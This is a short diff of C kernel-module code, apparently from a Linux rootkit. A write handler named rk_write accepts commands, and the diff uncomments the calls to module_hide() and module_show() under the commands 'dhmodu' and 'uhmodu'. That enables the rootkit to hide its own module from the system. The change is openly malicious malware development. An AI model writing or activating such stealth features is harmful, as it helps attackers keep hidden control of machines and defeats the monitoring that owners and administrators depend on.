@@ -208,12 +208,12 @@ static ssize_t rk_write(struct file *file, const char __user *buffer,
     else if(!strncmp(buffer, "dhmodu", MIN(6, count)))
     {
         //TODO: Fix module_hide
-        //module_hide();
+        module_hide();
     }
     else if(!strncmp(buffer, "uhmodu", MIN(6, count)))
     {
         //TODO: Fix module_show
-        //module_show();
+        module_show();
     }
 
     return count;
